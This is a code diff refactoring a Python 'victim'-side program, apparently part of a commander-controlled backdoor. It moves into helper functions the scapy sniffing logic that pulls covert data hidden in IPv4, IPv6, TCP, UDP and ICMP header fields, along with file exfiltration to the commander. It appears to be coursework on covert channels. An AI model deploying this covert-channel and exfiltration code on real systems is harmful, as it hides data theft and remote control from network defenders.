@@ -218,9 +218,6 @@ if __name__ == '__main__':
 
 # e) Receive File from Commander (Covert Channel)
                 if data.decode() == constants.TRANSFER_FILE_SIGNAL:
-                    # Initialize Variables
-                    received_packets = []
-                    source_ipv6_ip, cmdr_ipv6_addr, source_ipv6_port = "", "", constants.ZERO
                     print(constants.CLIENT_RESPONSE.format(constants.TRANSFER_FILE_SIGNAL))
 
                     # Send an initial acknowledgement to the client (giving them green light for transfer)
@@ -237,111 +234,8 @@ if __name__ == '__main__':
                         continue
                         # return None
 
-                    # Print configuration
-                    print(constants.RECEIVING_FILE_MSG.format(filename))
-                    print(constants.COVERT_CONFIGURATION_FROM_CMDR.format(choices[0], choices[1]))
-                    print(constants.COVERT_DATA_PACKET_LOCATION_MSG.format(choices[0], choices[1]))
-
-                    # Get function handler from a map (according to header/field)
-                    header_field_function_map = get_protocol_header_function_extract_map()
-                    if choices in header_field_function_map:
-                        selected_function = header_field_function_map.get(choices)
-
-                    # A callback function for handling of received packets
-                    def packet_callback(packet):
-                        global filename
-                        binary_data = selected_function(packet)
-                        return binary_data
-
-                    # DIFFERENT SNIFFS: For IPv4 Headers/Field
-                    if constants.IPV4 in choices:
-                        # Get total count of packets
-                        count = get_packet_count(client_socket)
-
-                        if constants.SOURCE_ADDRESS_FIELD in choices:
-                            received_packets = sniff(filter="dst host {} and dst port {}"
-                                                     .format(source_ip, source_port), count=count)
-                        else:  # REGULAR IPv4 SNIFF
-                            received_packets = sniff(filter="src host {}".format(client_address[0]), count=count)
-
-                    # DIFFERENT SNIFFS: For IPv6 Headers/Field
-                    if constants.IPV6 in choices:
-                        source_ipv6_ip, source_ipv6_port, cmdr_ipv6_addr = receive_get_ipv6_script(client_socket,
-                                                                                                   client_address[0],
-                                                                                                   client_address[1])
-
-                        # Get total count of packets
-                        count = get_packet_count(client_socket)
-
-                        if constants.NEXT_HEADER in choices:
-                            received_packets = sniff(filter="src host {} and dst host {}"
-                                                     .format(cmdr_ipv6_addr, source_ipv6_ip),
-                                                     count=count)
-                        else:
-                            received_packets = sniff(filter="dst host {} and dst port {}"
-                                                     .format(source_ipv6_ip, source_ipv6_port),
-                                                     count=count)
-
-                    # DIFFERENT SNIFFS: For TCP Headers/Field
-                    if constants.TCP in choices:
-                        count = get_packet_count(client_socket)
-
-                        if constants.SOURCE_PORT_FIELD in choices:
-                            received_packets = sniff(filter="tcp and dst host {} and dst port {} and "
-                                                            "(tcp[13] & 0x004 == 0)"  # tcp[13] offset RST flag (0x004)
-                                                     .format(source_ip, source_port),
-                                                     count=count)
-
-                        elif constants.DESTINATION_PORT_FIELD in choices:
-                            received_packets = sniff(filter="tcp and dst host {} and src host {} and "
-                                                            "(tcp[13] & 0x004 == 0)"
-                                                     .format(source_ip, client_address[0]),
-                                                     count=count)
-
-                        elif constants.FLAG in choices:  # Capture all flags
-                            received_packets = sniff(filter="tcp and dst host {} and dst port {}"
-                                                     .format(source_ip, source_port),
-                                                     count=count)
-                        else:
-                            received_packets = sniff(filter="tcp and dst host {} and dst port {} "
-                                                            "and tcp[13] & 0x004 == 0"
-                                                     .format(source_ip, source_port),
-                                                     count=count)
-
-                    # DIFFERENT SNIFFS: For UDP Headers/Field
-                    if constants.UDP in choices:
-                        count = get_packet_count(client_socket)
-
-                        if constants.DESTINATION_PORT_FIELD in choices:
-                            received_packets = sniff(filter="udp and dst host {} and src host {}"
-                                                     .format(source_ip, client_address[0]),
-                                                     count=count)
-                        else:
-                            received_packets = sniff(filter="udp and dst host {} and dst port {}"
-                                                     .format(source_ip, source_port),
-                                                     count=count)
-
-                    # DIFFERENT SNIFFS: For ICMP Header/Fields
-                    if constants.ICMP in choices:
-                        count = get_packet_count(client_socket)
-
-                        received_packets = sniff(filter="icmp and dst host {} and src host {}"
-                                                 .format(source_ip, client_address[0]),
-                                                 count=count)
-
-                    # Extract Data
-                    extracted_data = ''.join(packet_callback(packet)
-                                             for packet in received_packets if packet_callback(packet))
-
-                    # Write Data to File
-                    covert_data_write_to_file(extracted_data, filename)
-
-                    # Send ACK to commander (if good)
-                    if is_file_openable(filename):
-                        print(constants.TRANSFER_SUCCESS_MSG.format(filename))
-                        client_socket.send(constants.VICTIM_ACK.encode())
-                    else:
-                        client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
+                    receive_file_covert(client_socket, client_address[0], client_address[1],
+                                        source_ip, source_port, choices, filename)
 
 # f) Transfer file to Commander
                 if data.decode() == constants.GET_FILE_SIGNAL:
@@ -360,16 +254,15 @@ if __name__ == '__main__':
 
                     # If exists, then initiate file transfer
                     if os.path.exists(file_path):
-                        print(constants.GET_FILE_CMDR_PATH.format(file_path))
-                        print(constants.GET_FILE_FOUND_MSG.format(file_path))
-                        print(constants.GET_FILE_INIT_MSG.format(file_path))
-
+                        transfer_file_covert_helper_print_config(file_path, header, field)
                         client_socket.send(constants.GET_FILE_EXIST.encode())
                         transfer_file_covert(client_socket, client_address[0], int(cmdr_port),
                                              source_port, (header, field), file_path)
                     else:
                         client_socket.send(constants.GET_FILE_NOT_EXIST.encode())
                         print(constants.FILE_NOT_FOUND_ERROR.format(file_path))
+                        print(constants.AWAIT_NEXT_OP_MSG)
+                        print(constants.MENU_CLOSING_BANNER)
 
         except ConnectionResetError:
             print("[+] The client {}:{} disconnected unexpectedly.".format(client_address[0], client_address[1]))
